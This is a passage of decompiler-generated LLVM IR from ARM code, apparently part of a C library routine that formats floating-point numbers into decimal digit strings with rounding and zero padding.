  store i32 %v2_17de8, i32* %r3.global-to-local, align 4
  store i32 %v0_17dec, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_17df4 = trunc i32 %v1_17de4 to i8
  %v3_17df4 = inttoptr i32 %v2_17de8 to i8*
  store i8 %v1_17df4, i8* %v3_17df4, align 1
  %v0_17df8 = load i32, i32* %r0.global-to-local, align 4
  %v1_17df8 = load i32, i32* %r1.global-to-local, align 4
  %v2_17df8 = udiv i32 %v0_17df8, %v1_17df8
  store i32 %v2_17df8, i32* %r0.global-to-local, align 4
  %v0_17dfc = load i32, i32* %r5.global-to-local, align 4
  %v1_17dfc = add i32 %v0_17dfc, -8
  %v3_17dfc = sub i32 7, %v0_17dfc
  %v4_17dfc = and i32 %v3_17dfc, %v0_17dfc
  %v5_17dfc = icmp slt i32 %v4_17dfc, 0
  store i1 %v5_17dfc, i1* %cpsr_v.global-to-local, align 1
  %v6_17dfc = icmp slt i32 %v1_17dfc, 0
  store i1 %v6_17dfc, i1* %cpsr_n.global-to-local, align 1
  %v7_17dfc = icmp eq i32 %v0_17dfc, 8
  store i1 %v7_17dfc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_17df8, i32* %r4.global-to-local, align 4
  %v7_17e04 = icmp slt i32 %v0_17dfc, 9
  br i1 %v7_17e04, label %dec_label_pc_17dd4.dec_label_pc_17dd4_crit_edge, label %dec_label_pc_17e08

dec_label_pc_17dd4.dec_label_pc_17dd4_crit_edge:  ; preds = %dec_label_pc_17dd4
  %v1_17de8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17dd4

dec_label_pc_17e08:                               ; preds = %dec_label_pc_17dd4
  %v0_17e08 = load i32, i32* %r6.global-to-local, align 4
  %v1_17e08 = add i32 %v0_17e08, 1
  store i32 %v1_17e08, i32* %r6.global-to-local, align 4
  %v3_17e0c = sub i32 -1, %v0_17e08
  %v4_17e0c = and i32 %v1_17e08, %v3_17e0c
  %v5_17e0c = icmp slt i32 %v4_17e0c, 0
  store i1 %v5_17e0c, i1* %cpsr_v.global-to-local, align 1
  %v6_17e0c = icmp slt i32 %v0_17e08, 0
  store i1 %v6_17e0c, i1* %cpsr_n.global-to-local, align 1
  %v7_17e0c = icmp eq i32 %v0_17e08, 0
  store i1 %v7_17e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17e0c, label %dec_label_pc_17d98, label %dec_label_pc_17e14

dec_label_pc_17e14:                               ; preds = %dec_label_pc_17e08
  %v0_17e14 = load i32, i32* %r7.global-to-local, align 4
  %v1_17e14 = add i32 %v0_17e14, -96
  %v3_17e14 = sub i32 95, %v0_17e14
  %v4_17e14 = and i32 %v3_17e14, %v0_17e14
  %v5_17e14 = icmp slt i32 %v4_17e14, 0
  store i1 %v5_17e14, i1* %cpsr_v.global-to-local, align 1
  %v6_17e14 = icmp slt i32 %v1_17e14, 0
  store i1 %v6_17e14, i1* %cpsr_n.global-to-local, align 1
  %v7_17e14 = icmp eq i32 %v0_17e14, 96
  store i1 %v7_17e14, i1* %cpsr_z.global-to-local, align 1
  %tmp243 = icmp ult i32 %v0_17e14, 97
  br i1 %tmp243, label %bb188, label %thread-pre-split

bb188:                                            ; preds = %dec_label_pc_17e14
  %v5_17e20 = add i32 %v0_17e14, 32
  store i32 %v5_17e20, i32* %r3.global-to-local, align 4
  %v5_17e24 = urem i32 %v5_17e20, 256
  store i32 %v5_17e24, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_17e14, %bb188
  %stack_var_-66.0108114 = phi i8 [ 69, %bb188 ], [ %tmp151, %dec_label_pc_17e14 ]
  %v0_17e44 = phi i32 [ %v5_17e24, %bb188 ], [ %v0_17e14, %dec_label_pc_17e14 ]
  %v7_17e28 = icmp eq i32 %v0_17e44, 103
  %.229 = zext i1 %v7_17e28 to i32
  store i32 %.229, i32* %r3.global-to-local, align 4
  %v0_17e34 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17e34 = icmp slt i32 %v0_17e34, 0
  store i1 %v1_17e34, i1* %cpsr_n.global-to-local, align 1
  %v2_17e34 = icmp eq i32 %v0_17e34, 0
  store i1 %v2_17e34, i1* %cpsr_z.global-to-local, align 1
  %tmp191 = icmp slt i32 %v0_17e34, 1
  br i1 %tmp191, label %.thread13, label %bb192

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb194

bb192:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17e3c = icmp eq i1 %v7_17e28, false
  store i1 %v2_17e3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17e3c, label %bb194, label %bb193

bb193:                                            ; preds = %bb192
  %v2_17e40 = add i32 %v0_17e34, -1
  store i32 %v2_17e40, i32* %r8.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %.thread13, %bb192, %bb193
  %v0_17e50 = phi i32 [ %v0_17e34, %.thread13 ], [ %v0_17e34, %bb192 ], [ %v2_17e40, %bb193 ]
  %v1_17e44 = add i32 %v0_17e44, -102
  %v3_17e44 = sub i32 101, %v0_17e44
  %v4_17e44 = and i32 %v3_17e44, %v0_17e44
  %v5_17e44 = icmp slt i32 %v4_17e44, 0
  store i1 %v5_17e44, i1* %cpsr_v.global-to-local, align 1
  %v6_17e44 = icmp slt i32 %v1_17e44, 0
  store i1 %v6_17e44, i1* %cpsr_n.global-to-local, align 1
  %v7_17e44 = icmp eq i32 %v0_17e44, 102
  store i1 %v7_17e44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17e44, label %dec_label_pc_17e50, label %bb195

bb195:                                            ; preds = %bb194
  store i32 %v0_17e50, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17e74

dec_label_pc_17e50:                               ; preds = %bb194
  %v1_17e50 = load i32, i32* %sb.global-to-local, align 4
  %v2_17e50 = add i32 %v1_17e50, %v0_17e50
  store i32 %v2_17e50, i32* %ip.global-to-local, align 4
  %v2_17e54 = add i32 %v2_17e50, 1
  %v4_17e54 = sub i32 0, %v2_17e50
  %v5_17e54 = and i32 %v2_17e54, %v4_17e54
  %v6_17e54 = icmp slt i32 %v5_17e54, 0
  store i1 %v6_17e54, i1* %cpsr_v.global-to-local, align 1
  %v7_17e54 = icmp slt i32 %v2_17e54, 0
  store i1 %v7_17e54, i1* %cpsr_n.global-to-local, align 1
  %v8_17e54 = icmp eq i32 %v2_17e54, 0
  store i1 %v8_17e54, i1* %cpsr_z.global-to-local, align 1
  %v6_17e58 = icmp slt i32 %v2_17e50, -1
  br i1 %v6_17e58, label %dec_label_pc_17e5c, label %dec_label_pc_17e74

dec_label_pc_17e5c:                               ; preds = %dec_label_pc_17e50
  %v2_17e5c = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_17e5c, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_17e68 = bitcast i32* %stack_var_-87 to i8*
  %v3_17e68 = call i32 @__GI_memset(i8* %v2_17e68, i32 48)
  store i32 %v3_17e68, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17e74

dec_label_pc_17e74:                               ; preds = %dec_label_pc_17e50, %bb195, %dec_label_pc_17e5c
  %v1_17eb869 = phi i32 [ %v2_17df8, %bb195 ], [ %v3_17e68, %dec_label_pc_17e5c ], [ %v2_17df8, %dec_label_pc_17e50 ]
  %v1_17e9c = phi i32 [ %v0_17e50, %bb195 ], [ -1, %dec_label_pc_17e5c ], [ %v2_17e50, %dec_label_pc_17e50 ]
  %v1_17e78 = add i32 %v1_17e9c, -16
  %v3_17e78 = sub i32 15, %v1_17e9c
  %v4_17e78 = and i32 %v3_17e78, %v1_17e9c
  %v5_17e78 = icmp slt i32 %v4_17e78, 0
  store i1 %v5_17e78, i1* %cpsr_v.global-to-local, align 1
  %v6_17e78 = icmp slt i32 %v1_17e78, 0
  store i1 %v6_17e78, i1* %cpsr_n.global-to-local, align 1
  %v7_17e78 = icmp eq i32 %v1_17e9c, 16
  store i1 %v7_17e78, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_17e84 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_17e84, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_17e8c = icmp sgt i32 %v1_17e9c, 16
  br i1 %v7_17e8c, label %.thread18, label %dec_label_pc_17e98

.thread18:                                        ; preds = %dec_label_pc_17e74
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_17e90 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_17e90, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_17e98:                               ; preds = %dec_label_pc_17e74
  %v2_17e98 = ptrtoint i32* %stack_var_-86 to i32
  %v2_17e9c = add i32 %v1_17e9c, %v2_17e98
  store i32 %v2_17e9c, i32* %r3.global-to-local, align 4
  %v1_17ea0 = add i32 %v2_17e9c, 2
  %v2_17ea0 = inttoptr i32 %v1_17ea0 to i8*
  %v3_17ea0 = load i8, i8* %v2_17ea0, align 1
  %v4_17ea0 = zext i8 %v3_17ea0 to i32
  store i32 %v4_17ea0, i32* %r2.global-to-local, align 4
  store i32 %v1_17ea0, i32* %r1.global-to-local, align 4
  %v2_17ea8 = icmp ugt i8 %v3_17ea0, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_17ea8 = icmp ult i8 %v3_17ea0, 52
  store i1 %v6_17ea8, i1* %cpsr_n.global-to-local, align 1
  %v7_17ea8 = icmp eq i8 %v3_17ea0, 52
  store i1 %v7_17ea8, i1* %cpsr_z.global-to-local, align 1
  %v2_17eac = xor i1 %v2_17ea8, true
  %v3_17eac = or i1 %v7_17ea8, %v2_17eac
  br i1 %v3_17eac, label %bb196, label %bb197

bb196:                                            ; preds = %dec_label_pc_17e98
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_17e98, %bb196
  %v1_17eb868 = phi i32 [ %v1_17eb869, %dec_label_pc_17e98 ], [ 0, %bb196 ]
  %v2_17eb0 = xor i1 %v7_17ea8, true
  %v3_17eb0 = and i1 %v2_17ea8, %v2_17eb0
  br i1 %v3_17eb0, label %bb198, label %.preheader

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb197, %bb198, %.backedge
  %v1_17eb8 = phi i32 [ %v1_17eb8.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_17eb868, %bb197 ], [ 1, %bb198 ]
  %v0_17eb4 = phi i32 [ %v0_17ec0, %.backedge ], [ %v10_17e90, %.thread18 ], [ %v1_17ea0, %bb197 ], [ %v1_17ea0, %bb198 ]
  %v1_17eb4 = add i32 %v0_17eb4, -1
  %v2_17eb4 = inttoptr i32 %v1_17eb4 to i8*
  %v3_17eb4 = load i8, i8* %v2_17eb4, align 1
  %v4_17eb4 = zext i8 %v3_17eb4 to i32
  store i32 %v1_17eb4, i32* %r1.global-to-local, align 4
  %v2_17eb8 = add i32 %v4_17eb4, %v1_17eb8
  store i32 %v2_17eb8, i32* %r3.global-to-local, align 4
  %v1_17ebc = trunc i32 %v2_17eb8 to i8
  store i8 %v1_17ebc, i8* %v2_17eb4, align 1
  %v0_17ec0 = load i32, i32* %r1.global-to-local, align 4
  %v1_17ec0 = inttoptr i32 %v0_17ec0 to i8*
  %v2_17ec0 = load i8, i8* %v1_17ec0, align 1
  %v3_17ec0 = zext i8 %v2_17ec0 to i32
  store i32 %v3_17ec0, i32* %r2.global-to-local, align 4
  %v2_17ec4 = icmp ugt i8 %v2_17ec0, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_17ec4 = icmp ult i8 %v2_17ec0, 57
  store i1 %v6_17ec4, i1* %cpsr_n.global-to-local, align 1
  %v7_17ec4 = icmp eq i8 %v2_17ec0, 57
  store i1 %v7_17ec4, i1* %cpsr_z.global-to-local, align 1
  %v2_17ec8 = xor i1 %v2_17ec4, true
  %v3_17ec8 = or i1 %v7_17ec4, %v2_17ec8
  br i1 %v3_17ec8, label %bb199, label %bb200

bb199:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb200

bb200:                                            ; preds = %.preheader, %bb199
  %v2_17ecc = xor i1 %v7_17ec4, true
  %v3_17ecc = and i1 %v2_17ec4, %v2_17ecc
  br i1 %v3_17ecc, label %bb201, label %._crit_edge

._crit_edge:                                      ; preds = %bb200
  %v1_17ed4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb202

bb201:                                            ; preds = %bb200
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb202

bb202:                                            ; preds = %._crit_edge, %bb201
  %v1_17ed4 = phi i32 [ %v1_17ed4.pre, %._crit_edge ], [ 1, %bb201 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_17ed0 = icmp ult i8 %v2_17ec0, 48
  store i1 %v6_17ed0, i1* %cpsr_n.global-to-local, align 1
  %v7_17ed0 = icmp eq i8 %v2_17ec0, 48
  store i1 %v7_17ed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17ed0, label %.thread20, label %bb203

.thread20:                                        ; preds = %bb202
  %v2_17ed4 = or i32 %v1_17ed4, 1
  store i32 %v2_17ed4, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17ed821 = icmp slt i32 %v2_17ed4, 0
  store i1 %v1_17ed821, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb203:                                            ; preds = %bb202
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17ed8 = icmp slt i32 %v1_17ed4, 0
  store i1 %v1_17ed8, i1* %cpsr_n.global-to-local, align 1
  %v2_17ed8 = icmp eq i32 %v1_17ed4, 0
  store i1 %v2_17ed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17ed8, label %dec_label_pc_17ee0, label %.backedge

.backedge:                                        ; preds = %bb203, %.thread20
  %v1_17eb8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_17ee0:                               ; preds = %bb203
  store i32 %v2_17e84, i32* %r2.global-to-local, align 4
  %v2_17ee4 = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_17ee4, i32* %r3.global-to-local, align 4
  %v2_17ee8 = sub i32 %v0_17ec0, %v2_17ee4
  %v3_17ee8 = icmp uge i32 %v0_17ec0, %v2_17ee4
  %v4_17ee8 = xor i32 %v0_17ec0, %v2_17ee4
  %v5_17ee8 = xor i32 %v2_17ee8, %v0_17ec0
  %v6_17ee8 = and i32 %v5_17ee8, %v4_17ee8
  %v7_17ee8 = icmp slt i32 %v6_17ee8, 0
  store i1 %v7_17ee8, i1* %cpsr_v.global-to-local, align 1
  %v8_17ee8 = icmp slt i32 %v2_17ee8, 0
  store i1 %v8_17ee8, i1* %cpsr_n.global-to-local, align 1
  %v9_17ee8 = icmp eq i32 %v0_17ec0, %v2_17ee4
  store i1 %v9_17ee8, i1* %cpsr_z.global-to-local, align 1
  %v2_17eec = xor i1 %v3_17ee8, true
  %v3_17eec = or i1 %v9_17ee8, %v2_17eec
  br i1 %v3_17eec, label %bb204, label %.thread124

bb204:                                            ; preds = %dec_label_pc_17ee0
  store i32 %v2_17ee4, i32* %r2.global-to-local, align 4
  store i32 %v2_17ee4, i32* %r1.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_17ee0, %bb204
  %v2_17f08 = phi i32 [ %v2_17ee4, %bb204 ], [ %v0_17ec0, %dec_label_pc_17ee0 ]
  %v4_17ef8123 = phi i32 [ %v2_17ee4, %bb204 ], [ %v2_17e84, %dec_label_pc_17ee0 ]
  %v2_17ef4 = xor i1 %v9_17ee8, true
  %v3_17ef4 = and i1 %v3_17ee8, %v2_17ef4
  br i1 %v3_17ef4, label %bb205, label %.thread125

bb205:                                            ; preds = %.thread124
  %v4_17ef4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_17ef4, i32* %r0.global-to-local, align 4
  %v5_17ef8 = add i32 %v4_17ef8123, 2
  store i32 %v5_17ef8, i32* %r2.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb205
  br i1 %v3_17eec, label %bb206, label %bb207

bb206:                                            ; preds = %.thread125
  %v4_17efc = load i32, i32* %sb.global-to-local, align 4
  %v5_17efc = add i32 %v4_17efc, 1
  store i32 %v5_17efc, i32* %r0.global-to-local, align 4
  br label %bb207

bb207:                                            ; preds = %.thread125, %bb206
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17f04 = load i32, i32* %r7.global-to-local, align 4
  %v1_17f04 = add i32 %v0_17f04, -103
  %v3_17f04 = sub i32 102, %v0_17f04
  %v4_17f04 = and i32 %v3_17f04, %v0_17f04
  %v5_17f04 = icmp slt i32 %v4_17f04, 0
  store i1 %v5_17f04, i1* %cpsr_v.global-to-local, align 1
  %v6_17f04 = icmp slt i32 %v1_17f04, 0
  store i1 %v6_17f04, i1* %cpsr_n.global-to-local, align 1
  %v7_17f04 = icmp eq i32 %v0_17f04, 103
  store i1 %v7_17f04, i1* %cpsr_z.global-to-local, align 1
  %v3_17f08 = add i32 %v2_17f08, 1
  %v4_17f08 = inttoptr i32 %v3_17f08 to i8*
  store i8 0, i8* %v4_17f08, align 1
  %v0_17f0c = load i32, i32* %r1.global-to-local, align 4
  %v1_17f0c = add i32 %v0_17f0c, 1
  store i32 %v1_17f0c, i32* %r1.global-to-local, align 4
  %v0_17f10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17f10, label %bb208, label %dec_label_pc_17f40

bb208:                                            ; preds = %bb207
  %v0_17f14 = load i32, i32* %r0.global-to-local, align 4
  %v1_17f14 = load i32, i32* %ip.global-to-local, align 4
  %not.v7_17f18 = icmp sge i32 %v1_17f14, %v0_17f14
  %. = zext i1 %not.v7_17f18 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_17f20 = add i32 %v0_17f14, 4
  %v4_17f20 = sub i32 0, %v0_17f14
  %v5_17f20 = and i32 %v2_17f20, %v4_17f20
  %v6_17f20 = icmp slt i32 %v5_17f20, 0
  store i1 %v6_17f20, i1* %cpsr_v.global-to-local, align 1
  %v7_17f20 = icmp slt i32 %v2_17f20, 0
  store i1 %v7_17f20, i1* %cpsr_n.global-to-local, align 1
  %v8_17f20 = icmp eq i32 %v2_17f20, 0
  store i1 %v8_17f20, i1* %cpsr_z.global-to-local, align 1
  %v5_17f24 = icmp slt i32 %v0_17f14, -4
  br i1 %v5_17f24, label %.thread24, label %bb209

.thread24:                                        ; preds = %bb208
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb209:                                            ; preds = %bb208
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17f28 = icmp eq i1 %not.v7_17f18, false
  store i1 %v2_17f28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17f28, label %.thread, label %bb210

.thread:                                          ; preds = %.thread24, %bb209
  %v1_17f2c29 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17f2c29, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17f4c

bb210:                                            ; preds = %bb209
  %v3_17f30 = sub i32 %v1_17f14, %v0_17f14
  store i32 %v3_17f30, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17f58

dec_label_pc_17f40:                               ; preds = %bb207
  %v0_17f40 = load i32, i32* %r7.global-to-local, align 4
  %v1_17f40 = add i32 %v0_17f40, -102
  %v3_17f40 = sub i32 101, %v0_17f40
  %v4_17f40 = and i32 %v3_17f40, %v0_17f40
  %v5_17f40 = icmp slt i32 %v4_17f40, 0
  store i1 %v5_17f40, i1* %cpsr_v.global-to-local, align 1
  %v6_17f40 = icmp slt i32 %v1_17f40, 0
  store i1 %v6_17f40, i1* %cpsr_n.global-to-local, align 1
  %v7_17f40 = icmp eq i32 %v0_17f40, 102
  store i1 %v7_17f40, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_17f40, i32* %sl.global-to-local, align 4
  br i1 %v7_17f40, label %dec_label_pc_17f40.dec_label_pc_17f58_crit_edge, label %dec_label_pc_17f4c

dec_label_pc_17f40.dec_label_pc_17f58_crit_edge:  ; preds = %dec_label_pc_17f40
  %v0_17f58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17f58

dec_label_pc_17f4c:                               ; preds = %.thread, %dec_label_pc_17f40
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17f68

dec_label_pc_17f58:                               ; preds = %bb210, %dec_label_pc_17f40.dec_label_pc_17f58_crit_edge
  %v0_17f58 = phi i32 [ %v0_17f58.pre, %dec_label_pc_17f40.dec_label_pc_17f58_crit_edge ], [ %v0_17f14, %bb210 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17f58 = icmp slt i32 %v0_17f58, 0
  store i1 %v1_17f58, i1* %cpsr_n.global-to-local, align 1
  %v2_17f58 = icmp eq i32 %v0_17f58, 0
  store i1 %v2_17f58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_17f58, label %bb211, label %bb212

bb211:                                            ; preds = %dec_label_pc_17f58
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_17f60 = load i32, i32* %r2.global-to-local, align 4
  %v6_17f60 = add i32 %v5_17f60, -1
  %v7_17f60 = inttoptr i32 %v6_17f60 to i8*
  store i8 48, i8* %v7_17f60, align 1
  %v8_17f60 = load i32, i32* %r2.global-to-local, align 4
  %v9_17f60 = add i32 %v8_17f60, -1
  store i32 %v9_17f60, i32* %r2.global-to-local, align 4
  %v0_17f64.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_17f94.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_17f98.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17f98.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_17f58, %bb211
  %v1_17f98.pre = phi i1 [ %v1_17f98.pre.pre, %bb211 ], [ false, %dec_label_pc_17f58 ]
  %v0_17f98.pre = phi i1 [ %v0_17f98.pre.pre, %bb211 ], [ false, %dec_label_pc_17f58 ]
  %v1_17f94.pre = phi i32 [ %v1_17f94.pre.pre, %bb211 ], [ %v1_17f0c, %dec_label_pc_17f58 ]
  %v0_17f64 = phi i32 [ %v0_17f64.pre, %bb211 ], [ %v0_17f58, %dec_label_pc_17f58 ]
  store i32 %v0_17f64, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17f68

dec_label_pc_17f68:                               ; preds = %dec_label_pc_17f4c, %bb212
  %v0_18038 = phi i32 [ 0, %dec_label_pc_17f4c ], [ %v0_17f64, %bb212 ]
  %v1_17f9c = phi i1 [ false, %dec_label_pc_17f4c ], [ %v1_17f98.pre, %bb212 ]
  %v0_17f9c = phi i1 [ false, %dec_label_pc_17f4c ], [ %v0_17f98.pre, %bb212 ]
  %v1_17f94 = phi i32 [ %v1_17f0c, %dec_label_pc_17f4c ], [ %v1_17f94.pre, %bb212 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_17f74 = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_17f74, i32* %r3.global-to-local, align 4
  %v0_17f80 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f80 = inttoptr i32 %v0_17f80 to i8*
  %v2_17f80 = load i8, i8* %v1_17f80, align 1
  %v3_17f80 = zext i8 %v2_17f80 to i32
  store i32 %v3_17f80, i32* %r3.global-to-local, align 4
  %v5_17f80 = add i32 %v0_17f80, 1
  store i32 %v5_17f80, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_17f80, i32* %stack_var_-46, align 4
  %v2_17f94 = sub i32 %v1_17f94, %v5_17f80
  store i32 %v2_17f94, i32* %r1.global-to-local, align 4
  %v2_17f98 = xor i1 %v1_17f9c, %v0_17f9c
  br i1 %v2_17f98, label %.thread127, label %dec_label_pc_17fa0

.thread127:                                       ; preds = %dec_label_pc_17f68
  %v5_17f98 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_17f98, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18048

dec_label_pc_17fa0:                               ; preds = %dec_label_pc_17f68
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_17fa4 = sub i32 %v0_18038, %v2_17f94
  %v4_17fa4 = xor i32 %v2_17f94, %v0_18038
  %v5_17fa4 = xor i32 %v2_17fa4, %v0_18038
  %v6_17fa4 = and i32 %v5_17fa4, %v4_17fa4
  %v7_17fa4 = icmp slt i32 %v6_17fa4, 0
  store i1 %v7_17fa4, i1* %cpsr_v.global-to-local, align 1
  %v8_17fa4 = icmp slt i32 %v2_17fa4, 0
  store i1 %v8_17fa4, i1* %cpsr_n.global-to-local, align 1
  %v9_17fa4 = icmp eq i32 %v0_18038, %v2_17f94
  store i1 %v9_17fa4, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_17fb0 = xor i1 %v8_17fa4, %v7_17fa4
  br i1 %v2_17fb0, label %bb214, label %dec_label_pc_17fb4

dec_label_pc_17fb4:                               ; preds = %dec_label_pc_17fa0
  store i32 %v2_17fa4, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_17fa4, i1* %cpsr_n.global-to-local, align 1
  %v2_17fb8 = icmp eq i32 %v2_17fa4, 0
  store i1 %v2_17fb8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_17c18, i32* %lr.global-to-local, align 4
  %tmp213 = icmp slt i32 %v2_17fa4, 1
  br i1 %tmp213, label %.thread129, label %dec_label_pc_17fcc

.thread129:                                       ; preds = %dec_label_pc_17fb4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18044

dec_label_pc_17fcc:                               ; preds = %dec_label_pc_17fb4
  store i32 ptrtoint (i32* @global_var_1e1a7.1116 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_17fd8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_17fd8, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_18048

bb214:                                            ; preds = %dec_label_pc_17fa0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18024 = icmp slt i32 %v0_18038, 0
  store i1 %v1_18024, i1* %cpsr_n.global-to-local, align 1
  %v2_18024 = icmp eq i32 %v0_18038, 0
  store i1 %v2_18024, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_17c18, i32* %lr.global-to-local, align 4
  %tmp215 = icmp slt i32 %v0_18038, 1
  br i1 %tmp215, label %dec_label_pc_18044, label %dec_label_pc_18034

dec_label_pc_18034:                               ; preds = %bb214
  %v2_18038 = sub i32 %v2_17f94, %v0_18038
  store i32 %v2_18038, i32* %r1.global-to-local, align 4
  %v2_1803c = add i32 %v5_17f80, %v0_18038
  store i32 %v2_1803c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18044

dec_label_pc_18044:                               ; preds = %dec_label_pc_18034, %.thread129, %bb214
  %storemerge141.in = phi i32* [ %stack_var_-160, %bb214 ], [ %stack_var_-148, %.thread129 ], [ %stack_var_-148, %dec_label_pc_18034 ]
  %v0_1805882 = phi i32 [ %v2_17f94, %bb214 ], [ 0, %.thread129 ], [ %v2_18038, %dec_label_pc_18034 ]
  %storemerge141 = ptrtoint i32* %storemerge141.in to i32
  store i32 %storemerge141, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18048

dec_label_pc_18048:                               ; preds = %.thread127, %dec_label_pc_17fcc, %dec_label_pc_18044
  %v1_18078 = phi i32 [ %v2_17fd8, %dec_label_pc_17fcc ], [ %storemerge141, %dec_label_pc_18044 ], [ %v5_17f98, %.thread127 ]
  %v0_1809090 = phi i32 [ -1, %dec_label_pc_17fcc ], [ -1, %dec_label_pc_18044 ], [ %v0_18038, %.thread127 ]
  %v0_18058 = phi i32 [ 0, %dec_label_pc_17fcc ], [ %v0_1805882, %dec_label_pc_18044 ], [ %v2_17f94, %.thread127 ]
  %v0_18048 = load i32, i32* %fp.global-to-local, align 4
  %v1_18048 = add i32 %v0_18048, 12
  %v2_18048 = inttoptr i32 %v1_18048 to i32*
  %v3_18048 = load i32, i32* %v2_18048, align 4
